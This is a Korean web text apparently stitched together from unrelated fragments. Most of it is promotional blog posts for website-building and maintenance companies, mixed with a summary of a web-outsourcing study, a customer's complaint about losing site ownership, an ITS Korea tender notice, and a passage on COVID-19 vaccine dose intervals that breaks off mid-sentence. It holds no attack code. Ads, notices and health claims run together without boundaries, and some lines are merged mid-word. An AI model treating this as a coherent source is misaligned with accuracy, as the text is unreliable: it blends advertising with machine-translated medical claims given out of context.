구성이 잘 갖추어져 있어야 모든 것의 시작의 초점이 맞춰질 수 있습니다이런 작은 프로그램 하나 만으로도 사업권의 큰 기대를 가져볼 수 있는 부분도 있습니다. 적어도 실적이 낮아지지 않고 도움을 뒷받침 해주기 때문에 언제든 업무가 가장 수월하고 빠르게 처리될 수 있다는 장점으로, 관리자,영업자,고객분들 모두에게 손실이 없기에 많이 찾으시는 프로그램이 아닐까 싶습니다. 사업권이 많아도 단 하나의 프로그램 으로 통합적인 분석이 가능하기 때문에 경리업무를 보는 직원들 에게도 특히나 도움이 크게 될 것이며, 더욱 빠른 고객과의 소통으로 좀더 많은 신뢰감을 얻을 수 있는 사업권이 될 수 있다는 부분이 있습니다. ​사업권이  좀더 크고 튼튼하게 만들기 위해서는 기본적인 구성이 잘 갖추어져 있어야 모든 것의 시작의 초점이 맞춰질 수 있습니다. 특히나, 수작업으로 근무를 하는 곳은 많이 없기 때문에 어떤 프로그램을 좀더 효율적으로 이용을 하느냐에 따라 꾸준한 수입과 금전적인 피해를 피할 수 있다고 볼 수 있습니다.​디비쉐어는 모든 소비자,광고주,사업권 에 있어서 꼭 필요로한 프로그램으로 제작이 되었기 때문에 지금도 항상 많은 고객들의 신뢰를 바탕으로 도움을 드리고 있습니다.​           ​  웹아웃소싱 성공요인에 관한 탐색적 연구 자료 - 한국IT서비스학회 웹아웃소싱,홈페이지관리,웹관련 사업에 종사하시는 분 그리고 의뢰업체가 꼭 알아야할 사항같습니다. 변수조작적정의관계요인신뢰성계약사항 내용의 충실한 이행노력상대기업의 문제점 해결에관한 도움제공협력도상호간 동반자적 의식함유상호간 요구사항에 대한 이해도상호의사소통상호 정보교환의 원할정도계획및목표설정의 참여도적시 의사소통여부계약의요인계약의 명확성전문화된 요구의 기재정확한 서비스 수준의 기재계약서 상에 성과수준의 기재비용과 추가비용에 대한 정확한 기재계약서 상에 명시된 성과를 수행하지 못했을 경우에 대한 위약조항 명시아웃소싱의 인진된 이익전략적이익웹 기술 요원의 전문성 향상핵심 사업중심의 경영경제적이익웹 구축 비용감소( 자사제작비교)웹사이트 개발 전반에 걸친 위험의 감소기술적이익최신 웹기술의 용이한 획득웹전문가의 용이한 활용웹기술 능력의 향상웹사이트의 성공적인 구축을 통한 기업의 이익웹사이트를 통한 기업의 이미지개선및 인지도상승웹사이트를 통한 기업의 제품 판매량 증가웹사이트를 통한 기업의 마케팅능력 향상웹사이트를 통한 기업의 고객 서비스 증대웹사이트를 통한 기업의 내부 커뮤니케이션 향상웹사이트를 통한 기업의 업무 효율성 증대 이렇게 상호 존중과 이익을 위해 동반자적 상생관계가 되면 얼마나 좋을까요. 하지만 현실에서는 이렇게 하기가 힘듭니다.현실적 갑과 을의 관계에서 거의 갑이 휘두르는 조건 즉, 가격,서비스,유지보수등 전반적인 노예계약이나 다름없는 그런 조건에 울며 겨자먹기로 동의하고 계약할수 밖에 없습니다. 소프트웨어를 주축으로 한 IT산업의 현실이 아닐까 싶습니다.    구조적,제도적인 장치도 있어야 겠지만 무엇보다도 갑과을의 계약 당사자간 업체간의 인식도 하루 빨리 개선이 되어야 할것 같습니다.IT산업을 부흥시키기 위해서는 국가적 차원에서 홍보와 캠페인이 꼭 필요하다고 생각합니다.  홈페이지관리 - 웹아웃소싱 이지테이크  WWW.WEBOUTSOURCING.CO.KR홈페이지가 정부지원으로 관리되던것이자비를 들여 새롭게 업체를 선정하여새로운 쇼핑몰로 다시만들어 관리자홈페이지에대한 교육이 진흥청 전산실농민회관을 빌려  교육을 받았다새로운 기능과 시스템을 탑제시켜쇼핑몰로 새롭게태어나는 홈페이지타인의 손길이 아닌 본인의 손길로꾸며야하는 부분들에대한 기능을배우는 시간이었다아침부터  시작된교육은 오후늦게까지진행하였어도 못다한 교육앞으로2회정도는 더배워야 한다배우는 길에 바로하였으면 좋을듯 하지만일정을 조정하는 관계로 9월초순으로정해지고...이제부터는  홈페이지를어떻게가꾸어가야 하는지, 판매상품은어떻게 업그레이드 하여야할지에 대한고민이 깊어진다네이버 블로그는 맞지만, 확인불가관리비 3만원만 지불하면, 내 홈페이지는 무료제작, 월 3만원으로 홈페이지제작에, 관리까지 받아보세요~!!홈페이지 제작 업체 바른웹은 관리비가월 3만원으로 본인소유의 홈페이지를제작 해 드리고 5년 뒤에는 비용이발생하지 않기때문에 저렴하게~!!홈페이지 제작 및 관리까지 받아보실수 있어요!​http://tnr.kr/ma/link.php?lncd=S00203278YC05239777L 바른웹홈페이지제작, 반응형홈페이지, 모바일홈페이지, 무료홈페이지tnr.kr ​홈페이지제작업체 바른웹은 가성비갑!으로 저렴함 뿐만 아니라 경력도 높고디자인 퀄리티까지 높은 업체예요~!!많은 경험을 통해 고객님들이 필요로하는 서비스, 중요한 서비스들을 제공해 드리고 있는데 홈페이지 제작 업체고민중이시라면 오늘 제 포스팅에 꼭집중 해 주시길 바래요~!! 홈페이지제작업체를 고르실 때에 어떠한 부분들이 중요한지, 바른웹에서는 어떠한부분들은 제공 해 드리고 있으며, 여러번의 홈페이지 제작 의뢰 경험이 있는 제가 왜 많은 홈페이지 제작 업체들 중에서 왜 하필 바른웹을 추천 해 드리는지에 대해 자세히 설명 해드릴게요^ㅡ^​ ​홈페이지 제작 업체를 통해 홈페이지 제작 시 보통은 본인 소유가 아닌 임대형 홈페이지로 제작이 되는 경우들이 많습니다. 많은 홈페이지 제작 업체들이 본인 소유가 아닌 임대형 홈페이지로 제작을 해 드리고 있기 때문인데요. 본인 소유의 홈페이지와 임대형 홈페이지의 차이는 정말 큽니다! 홈페이지 제작에 드는 비용을조금이라도 절약하고 싶으시다면 임대형보다는 본인 소유의 홈페이지를 제작하는것이 좋습니다. 좀 더 자세히 말씀 드리자면, 임대형 홈페이지는 홈페이지를 오래 운영하실수록 더 많은 비용이 발생할 수 있으며,홈페이지 임의 수정 시, 수정 할때마다 추가비용이 발생할 수 있지만 본인 소유의 홈페이지는 말 그대로 본인의 소유 홈페이지이기때문에 홈페이지 임의수정도 언제든지 자유롭고 홈페이지 제작 업체 바른웹을 통하여 홈페이지 제작을 하신다면 관리비 월 3만원에 홈페이지무료제작, 관리까지 받아보실 수 있으며  5년뒤에는 비용이 발생하지 않기 때문에 정말 저렴하게 홈페이지 제작과, 관리까지 받아 보실 수 있답니다. ​ ​가성비는 가격에 비해 퀄리티도 좋다는말!홈페이지 제작업체 바른웹은 탬플릿형태가 아닌 전문 디자이너가 직접! 내 홈페이지를 제작 해 드리기 때문에디자인 퀄리티도 꽤 높은 편이예요~! 회사의 홈페이지 디자인이 회사의 이미지에도 영향을 꽤 미치기 때문에 홈페이지 제작 업체를 고르실 때에는 제작업체의 디자인 퀄리티도 따져보는 것이 좋습니다~!! 제작업체에서 제작한홈페이지들을 꼼꼼하게 보시구 마음에 드는 업체를 고르는 것이 좋아요~ 홈페이지 제작업체 바른웹에는 바른웹에서 제작한 홈페이지들을 구경하실 수 있는데요. 제 포스팅 위의 링크나 제 포스팅 맨 밑의 그림을 클릭하셔서 포토폴리오 부분에 구경하고 싶은 홈페이지를 클릭하시면 바른웹에서 제작한 홈페이지들을 구경하실 수 있답니다^_^​ ​홈페이지 제작업체 바른웹에서 일반홈페이지 제작 시, 고객님께서 원하신다면 모바일 홈페이지를 무료로 제작 해 드리고 있습니다~!!요즈음엔 모바일 홈페이지를 따로 제작하지 않아도 되는 반응형 홈페이지를 많이 선호하시지만, 홈페이지제작목적에 따라 일반형 홈페이지를제작하여야 할 수도 있으니 어떠한형태의 홈페이지로 제작해야 할 지잘 모르겠는 분들은 바른웹과 상담후에 결정하는 것을 추천드려요~!그리고 모바일 홈페이지 비용도 꽤많이드니 일반형 홈페이지로 제작해야하고 모바일 홈페이지가 필요하시다면 바른웹을 통해 홈페이지를제작하신다면 많은 비용을 절감하실수 있으실 거예요^ㅡ^!​ ​홈페이지 제작업체를 통해 홈페이지제작 시 제작업체에서 기본으로 제공해 드리는 페이지 수량이 있습니다.이 페이지 수량을 추가하면 추가되는만큼 추가비용이 발생하기 때문에,기본으로 제공 해 드리는 페이지수량이 많은 제작 업체를 택하는 것이좋습니다. 그렇기 때문에 이 기본으로 제공드리는 페이지 수량에 따라 비용차이가 많이 날 수 있는데요. 홈페이지 제작업체 바른웹에서는 32페이지라는 많은 수량을 제공 해 드리고 있어요. 기본으로 제공 해 드리는 페이지 수량이 많기 때문에 더 많은 페이지 수량이필요하더라도 더 저렴하게 할 수 있는것이 아닐까 싶어요.​ ​홈페이지 제작업체 바른웹은 7년간10.000여개 이상의 홈페이지를 제작 해 온 업체로 홈페이지 제작 경험도 많고 경력 또한 높은 업체랍니다~! 홈페이지 제작업체를 고르실 때에는 제작업체의 경력도 중요하게 보는 것이 좋은데, 이유는 여러가지가 있겠지만 아무래도 홈페이지 제작 진행 중 제작업체가 망해서 난감한 상황을 막을 수 있고, 또 홈페이지 제작진행에 있어 경험이 많을수록 더 부드러운 진행이 가능한 것이 큰 이유이지 않을까 싶어요~!홈페이지 제작업체 바른웹도 많은경험을 통하여 고객님들께 더 좋은서비스를 제공 해 드릴수가 있었다지요~!​ ​홈페이지 제작 업체 바른웹은~!관리비 월 3만원만 지불하시면고객님의 홈페이지를 무료로 제작해 드리고 있으니 월 3만원으로홈페이지 제작과 관리까지 받아보실 수 있는 좋은 업체랍니다~!그리고 5년뒤에는 비용이 발생하지 않는다니! 홈페이지 제작을고민중이신 분들!! 더 없이 좋은제작업체 바른웹으로 고민 팍!팍!날려보시길 바래요~!!​밑의 그림을 클릭하시면 홈페이지제작업체 바른웹에서 상담문의 및신청이 가능합니다.​ ​홈페이지 제작업체 바른웹을 통하여본인소유의 이쁘고 멋진 홈페이지제작 완성되시길 바랍니다^ㅡ^!!​​​​​​​​​​​​​​​​​​​​​​ ​ 홈페이지 신선유지관리 안내-신선유지관리홈페이지 운영에 있어서 편하고 빠른 유지보수 신청이 주요합니다.내 홈페이지 관리자로 로그인 하신후에 작업지시에 유지보수 내용을 작성해서 바로 신청이 가능합니다.무료 작업의 경우 24시간 이내 처리를 위해 노력하고 있습니다. (통상 요청의 70%~80% 이상이 무료작업) -웹브라우저 편집 시스템아직도 많은 홈페이지들이 전문 기술자들이 다룰수 있는 파일 형태로 홈페이지 제작/관리를 하고 있습니다.그런 경우는 관리 고객이 많아지면 기술자의 업무의 병목현상으로 유지관리의 업무속도는 느려지게 됩니다.로우사이트는 웹브라우저 편집방식을 고집합니다.기존 관리 방식의 한계를 넘어 다음과 같은 장점이 있습니다.1. 기본 유지보수의 범위가 넓어집니다.과거 유료 작업 이었던 메인메뉴의 이름이나 위치변경 등의 작업이 무료로 처리 됩니다.2. 다양한 기능이 이미 준비되어 있습니다.제작 당시에는 고려하지 못했던 여러 기능들을 운영중에도 무료 또는 적은 비용으로 사용할 수 있도록 다양한 기능을 준비해 두었습니다.3. 필요한 경우 직접 관리할 수 있습니다.유지관리를 직접 하길 원하는 경우 페이지관리와 게시판관리 기능을 추가 비용을 들여 별도로 개발하는 분들도 계십니다.저희가 제작해 드리는 홈페이지는 그런 편집기능이 준비되어 있습니다. (단, 약간의 비용을 지불 하시면 별도의 편집 기능과 메뉴얼 + 무료교육을 제공 합니다) -맞춤제작이 가능한 독립형홈페이지는 제작 후 유지관리가 더 중요합니다.초기 구상과는 다른게 제작하고 운영하시면 메뉴나 내용의 변경의 필요서을 느끼게 되실겁니다.이런 경우를 대비해서 유지관리를 쉽게 할 수 있는 구조로 제작이 됩니다.독립형 홈페이지는 운영중 필요한 다양한 요구사항을 충족시킬 만큼의 확장성이 제공되어야 합니다.게시판을 수정해서 만드는 간단한 인트라넷은 물론 그룹웨어 수준의 관리프로그램 개발 까지 홈페이지와 함께 운영이 가능합니다.  블로그형형홈페이지 업체를 알아보시기전, 제작을 의뢰하시려고 고민중이시라면 여러가지 사항등을 통해 전문업체를 선택하시는 것이 좋습니다. 내가 원하고자 하는 특징이나 차별화점을 얼마나 잘 살려 만들어내는 지도 중요한 항목중에 하나이기 때문에 어떻게 관리하고 유지할 수 있는지등을 잘 살피어 효과적으로 마케팅과 함께 보다 쉽게 홍보할 수 있는 방안을 선택하시길 바랍니다.  ​ ✔홈페이지가 있지만 블로그형홈페이지 제작을 원한다면 ?홈페이지가 있는 상태에서 만드려고 하는지, 홈페이지가 없는 상태에서 홈페이지를 대신해서 만들려고 하는지 등의 여부를 먼저 파악하는 것이 필요합니다. 홈페이지가 있는 상태에서 블로그의 운영 관리에는 홈페이지를 운영하고 있지만 홍보효과로써는 미비하기 때문에 마케팅의 수단에 맞춰서 제작을 원하시는 경우가 있습니다.​​​ ​ ✔홈페이지를 운영하기에 어려움이 많아 필요하다면 ?하나의 홈페이지를 구축하고 운영하기에는 유지 나 보수관리에서 어려움을 겪을 수 있기 때문에 블로그형홈페이지를 원하시는 분들도 있습니다. 이때에는 홈페이지에 내용을 충분히 살려서 제작되어야 하며, 홈페이지에 담을 내용들과 컨텐츠와 구성부분을 조금 더 전문적으로 다가가는 것이 좋습니다.​​​ ​ ✔디자인의 요소에 따라서그럼 우리가 예를들어 소개팅을 나가서 또는 사람을 볼때 가장 먼저 보는 것이 바로 얼굴인데요 평가에 의미가 아닌, 사람을 처음 만날때 얼굴을 보며 인사하듯이 블로그도 마찬가지입니다 단순한 블로그가 아닌, 홈페이지의 특성을 살려 제작하고있기 때문에 처음 접하는 디자인 요소또한 가장 중요한 항목중에 하나입니다.​​​ ​ ✔업종별에 따른 디자인제작사례로업체를 선택하기 전 아마 많은 디자인제작사례들이나 콘티들을 많이 만나보셨을텐데요 또한 똑같은 업종이라고 하더라도 수많은 블로그들이 있어서 그 안에서 우리브랜드가 조금 더 차별성을 가질 수 있을까 또는 내가 원하는 컨셉으로 이루어질까 ? 등의 걱정이 따르신다면 김가네마케팅에서는 업종별에 따른 관리 와 다각적인 디자인을 제시해드리고 있습니다.​​​ ​ ✔관리의 유지성홈페이지와 닮은 듯하지만 닯지 않는 부분에서는 바로 유지성입니다. 홈페이지는 보수나유지관리가 어려운 면이 단점이지만 블로그는 내가 어떻게 관리하느냐에 따라서도 그 유지성은 달라지기 때문에 전문블로그관리업체를 통해 유지할 수 있는 블로그형홈페이지가 만들어져야 합니다.​​​ ​ 저희 김가네마케팅에서는 단순하게 홍보만을 위함이 아닌, 시각적으로 다각적으로 다양한 컨텐츠와 무조건 상위노출이 아닌 꾸준함으로 유입될 수 있는 타겟층을 만들어내고 그 브랜드가 전달하고자 하는 내용들을 조금 더 다양하게 구상할 수 있도록 전달하고 있습니다. 눈에 띄는 나만의 브랜드 구축을 위해서 꼭 필요한 블로그형홈페이지는 경쟁력은 살리고 다양한 제작사레등을 보유하여 해당브랜드의 원하고자 하는 마케팅과 시너지 효과를 낼 수있도록 시작해드리고 있습니다.​​​ ​ ​​​지금 1:1 무료컨설팅 상담과 다양한 업종별에 맞춘 블로그제작사례들 예시들을 통해 원하고자 하는 컨셉과 마찬가지로 홈페이지블로그제작을 시작으로 키워드광고 + 블로그관리 +언론보도등으로 변화되는 노출 로직에 민감하게 대응하며, 약 3000건 이상의 블로그 디자인 제작으로 온라인 관고 무료 진단 및 컨설팅을 통해 잠재고객을 잡는 로얄키워드를 공략하고 있습니다. " 블로그마케팅의 성공은 김가네마케팅에서 "꿈의 날개를 펼쳐드릴 수 있도록 제작부터 빠른 피드백까지 !​https://blog.naver.com/aram1166​​​ ​ ​​ 안녕하세요. 제가 약 5년전 동생과 일을 하면서 수익형 홈페이지를 개설했던 적이 있었습니다. 그 당시 초기 홈페이지 제작 비용으로 약 300만원을 지급하고 5년동안 연간 50만원의 관리비를 지불 했었습니다. 지금와서 생각을 해보니 후회가 너무 되네요. 그리고 추후에는 돈이 아깝다는 생각이 들어서 홈페이지 관리를 하지 않겠다고 하니 업체 측에서 홈페이지를 지워버렸습니다. 저와 같은 피해사례가 없길 바라며 홈페이지 제작 의뢰 시 Tip에 대해서 알려드릴려고 합니다.​ 홈페이지 제작 시 꼭 알아두어야 할 Tip홈페이지제작 을 의뢰했을 때 꼭 알아야 하는 팁이 몇가지 있습니다. 1. 초기 비용 2. 관리 비용 3. 홈페이지 소유권 4. 백업 가능여부  크게 4가지로 분류 됩니다. ​​ 홈페이지제작 종류와 초기 비용초기비용의 경우 본인이 할 수 있다면 그만큼 좋을게 없다. 예로 네이버 스마트스토어 같은 경우에는 혼자만의 힘으로 충분히 가능하다. 즉, 무료라는 말이 된다. 하지만 스마트스토어 외의 정말 기업형 홈페이지 제작이나 혹은 개인만의 수익형 홈페이지 제작을 생각 중이라면 여러 업체를 찾아 견적을 받아봐야한다.​홈페이지의 종류는 3가지로 분류 된다.  즉, 제작 비용도 3분류로 나뉘어 진다는 것이다.​첫번째 기본형이다. 기본형은 일반 웹사이트 형식으로 모바일에서는 지원되지 않는다. 컴퓨터로 특정 홈페이지를 들어갔을 때와 핸드폰으로 특정 홈페이지를 들어가보면 알 수 있다. 즉, 기본형은 PC에 최적화된 홈페이지이다. 이 기본형의 경우 초기비용이 무료인 곳도 있고 요즘 150~250 사이이다. 저의 경우 5년전 300을 지불 했었습니다.​두번재 모바일용 홈페이지. 모바일 전용 홈페이지의 경우 제작 비용은 50~100으로 형성되어 있습니다. 요즘 핸드폰으로 주로 검색을 하지만 모바일만 하는 분들은 많지 않은 걸로 알고 있습니다.​세번째 기본형+모바일 홈페이지. 반응형 홈페이지라고도 부릅니다. 가장 인기있는 홈페이지 형식입니다. PC접속시 PC에 최적화된 홈페이지가 나오고 핸드폰으로 접속하면 모바일에 최적화된 화면이 디스플레이 됩니다. 그만큼 고객입장에서 편리하기 때문에 가격적으로 조금 첫번째와 두번째 타입보다는 경제적으로 부담이 됩니다. 250~400으로 형성되어 있습니다.​하지만 아래와 같이 저렴하고 합리적인 비용의 업체도 존재합니다. ​​이렇듯 가격에 차이가 나는 이유는 기업으로 운영 중인 업체인지 아니면 개인이 운영하는 업체인지에 따라 가격이 달라지게 됩니다. 그리고 퀄리티에 따라서도 달라지게 됩니다. 이 부분에 대해서는 여러 업체들과 상담을 해보고 견젹을 받아 비교해는 방법이 제일 좋습니다.​ 관리비용 홈페이지제작을 돈주고 했는데 무슨 관리비용인가요?라고 생각하시는 분들이 있을 것 같습니다. 예로 매주마다 새로운 상품을 업로드 해야한다면 매주마다 업체에 의뢰를 해야합니다. 이러한 명목으로 관리비용이 청구됩니다. 그런데 홈페이지 제작 비용을 지불 했는데 연간 50만원의 비용을 따로 지불 해야 한다니 꾀 큰 금액이죠. 하지만 그렇지 않은 회사도 있습니다. 아래 사진 처럼요. 홈페이지 소유권홈페이지제작 을 의뢰했을 때 추후 계약 만료나 관리해지시 홈페이지 소유권이 본인에게 있는지 아니면 제작 업체에게 있는지 꼭 확인 해보셔야 합니다. 저의 경우 예전에 만든 홈페이지를 다시 사용해서 다른 업체에 관리를 맞기고 싶지만 소유권이 저에게 없어서 불가능한 상태입니다. 이점 꼭 계약시 확인 하셔야 합니다. 홈페이지 백업 가능 여부홈페이지를 운영하면서 대대적인 업데이트를 진행하게 되면 전체적으로 크게 변경되기 때문에 다시 되돌리기 위해서는 백업이 중요 합니다.   ​​제가 의뢰를 맡겼던 업체의 홈페이지 제가 실력은 다른 곳과 비교했을 때 매우 낮은 수준이였습니다. 계약전 업체에서 이제 까지 진행했었던 홈페이지들을 보여달라고 하시고 체크 해보시길 바랍니다. 아래는 제가 찾은 업체에서 진행했었던 사이트인데 퀄리티가 매우 좋네요.  ​​ 저렴한 비용에서 관리까지 해보고 싶으신 분은 아래를 참고해보시길 바랍니다. 감사합니다. 무료홈페이지제작0% 절감효과 인증 개인정보 수집 및 이용동의leaderscpa.com ​ 홈페이지 크리스마스 스킨 업데이트 안내 원장님~ 어제 눈이 엄청내렸지요~ 겨울분위기가 펑펑 나고 있습니다~~벌써 크리스마스가 가까워지고 있네요~~ *^^*그래서 저희 피에스포유 스마트쌤에서 스페셜한 홈페이지스킨을 업데이트 했습니다~~많은 이용 부탁드리며, 항상 스마트쌤을 잘 이용해주시는 원장님들 모두 메리크리스마스예요  * 세가지 색상으로 다양하게 준비하였으니 마음에 드시는 것으로 사용하시면 됩니다 ^^   [christmas01] [christmas02] [christmas03]﻿ * 스킨설정은 홈페이지관리-스킨선택에서 크리스마스01 ~ 03 을 선택하시면 적용됩니다.﻿  안녕하세요 학원홈페이지제작업체 학원사랑넷입니다.학원 홈페이지를 제작하면서 가장 많이 문의 하시는 부분은 두가지인것 같습니다.먼저 가격! 그리고 쉽게 관리가 가능한지!​착한 가격으로 제작하고 쉽고 편하게 관리가 가능하다면 그것만큼 좋은 홈페이지가 없겠죠​학원 홈페이지를 어떻게 제작하고 어떻게 관리 해야하는지 궁금하다면착한 가격으로 제작하고 저렴한 월 사용료로 운영할 수 있는 학원사랑넷 홈페이지 서비스에 대해 안내드리겠습니다.  학원사랑넷은 홈페이지 구축비용이 33만원으로 거품이 없는 제작비를 통해 홈페이지 구축이 가능합니다.여기에 월 22,000원의 저렴한 사용료를 통해 학원운영의 부담을 줄여드리기 위해 서비스를 하고 있습니다.가격만 착해서는 소용이 없죠!! 현재 트렌드에 맞는 인터페이스 시스템을 적용하여 어디서든 홈페이지를 확인할 수 있어 PC와 태블릿, 스마트폰 어디서든 호환 가능하여 스마트 시대의 트렌드를 반영하여 서비스 하고 있습니다  학원사랑넷은 단순히 1번 제작을 위해 홈페이지를 만들지 않습니다. 20년 이상 홈페이지 제작을 해온 경력을 통해 쌓은 각종 노하우를 홈페이지 제작과정과 제작 시스템, 관리 시스템에 적용하였습니다.그리고 10년 이상의 경험을 가진 디자이너가 만들어내는 디자인 컨텐츠와 각종 메인 컨텐츠를 통해 퀄리티있는 디자인 영역을 구축해놓았습니다  학원사랑넷은 앞서 안내드린대로 반응형 홈페이지로 제작되어 PC / 태블릿 / 스마트폰 어디서든자유롭게 홈페이지를 볼 수 있는 홈페이지 구성으로서비스를 하고 있습니다 학원사랑넷은 학원홈페이지 제작과 이후에 시간도 중요하게 생각합니다.그래서 각종 컨텐츠를 수정할 수 있는 홈페이지 수정시스템을 통해 직접 쉽고 간편하게 홈페이지를 관리 할 수 있고 관리시 문제 발생을 방지하고자 자동복구기능까지 제공하여 수정이 잘못되더라도 이전 수정버전으로 복구할 수 있어 관리가 더욱 편해졌습니다  이벤트 진행과 학원 이슈사항을 알릴 수 있는 팝업 서비스도팝업 샘플과 간단한 내용 수정을 통해팝업을 만들 수 있는 팝업 제작 시스템을 제공하고 있어누구나 간단하게 팝업을 만들 수 있습니다 코로나로 인한 비대면 서비스에 대해서도 많은 관심을 갖고 있는 학원가인데요​학원사랑넷은온라인 강의 시스템 서비스가 가능해온라인으로 서비스를원하는 학원에서도홈페이지 제작과 함께 온라인 강의 서비스를같이 진행할 수 있습니다​강사관리와 수강자관리 부터패키지강좌관리 온라인 결제시스템까지준비되어 있습니다 온라인 강의 시스템을 운영하거나 학원홈페이지만 제작하여 운영을 할때 회원관리가 참 중요해집니다 학원사랑넷은 회원가입 알림기능으로 회원가입시 자동으로 관리자에게 문자 또는 메일을 발송하여 좀 더 빠른 관리가 가능하도록 지원하고 있으며 가입약관과 가입양식을 설정할 수 있어 학원 운영 방침에 맞는 회원가입 구성을 할 수 있습니다  이와 같이 다양한 관리 기능과 합리적인 제작비용과 운영비로효과적인 학원 홈페이지 제작과 운영을 할 수 있는학원사랑넷입니다.상담 먼저 받아보시고 결정하셔도 늦지 않습니다.^^ 학원사랑넷학원 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.hakwon-love.net ​ #국제협력센터 #ITSKOREA #ITS #홈페이지 #유지관리 #기능개선 #용역 공고번호 공공 2021-3471. 입찰에 부치는 사항가. 용 역 명 : ITS 국제협력센터 홈페이지 유지관리 및 기능 개선 용역나. 용역기간 : 착수일 ~ 2022.01.31.    * 준공 후 90일까지 무상 유지관리 서비스 제공다. 배정예산 : 금30,000,000원(금삼천만원, VAT 포함)라. 입찰참가신청 및 제안서 접수 마감 : 2021년 5월 14일 16시마. 접 수 처 : 경기도 안산시 상록구 성호로 31 한국지능형교통체계협회 3층 공공지원센터 국제협력팀바. 제안서 평가 및 협상대상자 발표 : 우선협상대상자로 선정된 업체에 개별 유선 통보사. 상세정보 : 첨부파일 참조​ 첨부파일[입찰공고문]ITS 국제협력센터 홈페이지 유지관리 및 기능 개선 용역.pdf파일 다운로드 첨부파일[제안요청서]ITS 국제협력센터 홈페이지 유지관리 및 기능 개선 용역.pdf파일 다운로드 ITS KoreaHome 알림서비스 공지사항 공지사항 ITS Korea의 공지사항 상세입니다. [입찰공고]ITS 국제협력센터 홈페이지 유지관리 및 기능개선 용역(~5/14) 2021-05-07 | 작성자 : 국제협력팀 | 조회 : 21 공고번호 공공 2021-347 1. 입찰에 부치는 사항 가. 용 역 명 : ITS 국제협력센터 홈페이지 유지관리 및 기능 개선 용역 나. 용역기간 : 착수일 ~ 2022.01.31.     * 준공 후 90일까지 무상 유지관리 서비스 제공 다. 배정예산 : 금30,000,000원(금삼천만원, VAT 포함) 라. 입찰...itskorea.kr ​ ​안녕하세요.홈페이지관리업체를 찾으시나요?​저렴한 비용같은 가성비를 추구하시는 분들이 많으신대요.터무니없이 저렴한 곳과 계약하신다면 주의하셔야 합니다.그만큼 낮은 퀄리티의 결과물이 나올 수 있기 때문입니다.돈, 시간을 들이고 소비자들에게 좋지않은 인상을 심어줄 수 있기 때문인데요. 좋지않은 선택이 될 수 있습니다. ​​ ​​그래서 빠르고 깔끔하면서 높은 완성도의 성과물을 낼 수 있는 #홈페이지관리업체 를 찾으셔야 합니다.또한 다양한 업종에 경험이 있는홈페이지관리업체를 선정하는 것도 중요한대요그렇기에 PC, 모바일, 태블릿 등 다양한 환경에 적합하게 만드는 것이 필요합니다. ​​ ​​ 홈페이지관리업체 청년디자인 각 업계나 회사에 맞는 이미지를 잘 구현해냅니다.다양한 니즈에 맞도록 구현하고 있습니다.기획부터 제작, 홍보, 유지보수까지 수년간경력이 많기 실패없이 홈페이지관리가 가능합니다.유지보수 경험이 많고 업체 경력이 오래된 경우홈페이지 기술의 변천사를 알고 있기 때문에유지보수 서비스를 받으며 내 홈페이지의 바람직한 개선방향을 제안 받을 수도 있습니다.​​​ ​​​단순히 디자인적인 방향 뿐만 아니라, 기능적인 부분에서 지금 사용된 기술이 이미 사장된 기술이라든지, 아니면다른 업체로 이관 관리가 안되는 기술이라든지, 모바일쪽에서 어떤 문제가 우려된다든지 등..고객 입장에서는 예상하지 못할 여러가지 경우의수를 미리 알려줄 수 있습니다.저희는 이러한 종합적인 판단을 할 수 있습니다.​​​ ​홈페이지관리 ,제작, 홍보 모든 것을 하는 데 있어서 저희는 회사 자체적인 기술력만을 사용합니다. 다른 업체에게 일부 작업을 하청하는 일이 없습니다. 그래서 가격 역시 거품이 없고 저렴하고 합리적입니다.​​ ​​​홈페이지제작 이후 관리, 유지보수도 중요합니다.신뢰도와 관련이 있는 홈페이지는 관리가 되지 않으면지저분해지고 운영을 하지 않는다는 오해를 부를 수 있으며 무엇보다 신뢰도를 잃어버릴 수 있습니다. 인터넷에서 자주 발생하는 트래픽 문제로 인한 버벅임, 홈페이지 다운 등 기술적인 부분을 저희가 미리 방지하고 빠르게 처리하여 최적의 업무환경을 조성해드리겠습니다. ​​ ​​최근 홈페이지 제작에 대한 문의도 많습니다. 여러분의 머릿속에 있는 희미한 이미지들을 저희가 만들어 드리겠습니다.홈페이지에 대한 상담과 홈페이지견적 그리고 제작부터 관리, 홍보 모든 것을 원하신다면 고민하지 마시고 아래의 홈페이지와 전화로 문의를 주세요!​ 클릭시 문자로 연결됩니다. ​ 똑똑뉴스 홈페이지에 하루 5개씩 보도자료를 등록하였습니다. ​그런데.. 닷새만에 부작용이 발생했습니다. ​블로그 방문자수 정체 현상이 생긴 겁니다. ​체험단을 맡으려면 블로그 방문자수가 일정 수준 이상이 되어야 합니다만 ​현재 상황은 많이 모자릅니다. ​똑똑뉴스 홈페이지에는 당분간 중요 보도자료 2개만 매일 취급할 예정이고 나머지는 블로그에서 취급하려고 합니다. ​따라서 선 블로그 후 똑똑뉴스로 가닥을 잡기로 하였습니다. ​감사합니다. ​#GS개나리콘 #골드스타 #순간의선택이10년을좌우합니다 #광고카피40주년  코로나 백신 접종 바로가기 >> 코로나 백신 접종 예약질병관리청 코로나19 예방접종 사전예약 시스템 누리집 홈페이지 예약관리 예방접종 증명서 확인서 발급 쿠브 사이트 코로나 mRNA 백신의 투여량 사이의 간격이 12주이며 아스트라 제네카 백신의 경우 8-12주입니다.백신에 의해 제공되는 보호는 두 용량 사이의 더 긴 간격과 함께 더 좋다. 이것은 신체의 면역 반응이 성숙하고 바이러스에 달라 붙는 항체뿐만 아니라 충분한 수의 기억 T 세포 또는 방어 세포를 생산할 수 있기 때문입니다. 기억 T 세포의 도움으로 예방 접종을 받은 사람들은 다음 번에 바이러스에 직면할 때 심각한 질병으로부터 더 잘 보호된다.반면, 선량 사이의 간격이 길어질수록 백신의 공급이 제한되어 있어도 백신을 이전보다 더 많은 사람들에게 빠르게 제공할 수 있다는 것을 의미한다. 이것은 가능한한 많은 심각한 사례와 질병으로 인한 사망을 예방할 수 있게 합니다.아스트라제네카 백신의 두 번째 투여량은 첫 번째 투여 후 이미 8주 후에 투여될 수 있는데, 왜냐하면 투여량 사이의 짧은 간격이 인구 수준에서 예방접종의 진행을 늦추지 않기 때문이다.질병관리청 코로나19 예방접종 사전예약 시스템 누리집 홈페이지 예약관리 예방접종 증명서 확인서 발급 쿠브 사이트 mRNA 예방 접종 사이의 12주 간격에 대한 예외는 예를 들어 암 치료가 시작되기 전, 비장 절제술 또는 사람의 면역 체계가 매우 약한 경우에만 가능합니다. 선량 사이의 간격은 또한 근거가 있는 개인적인 이유로 변경될 수 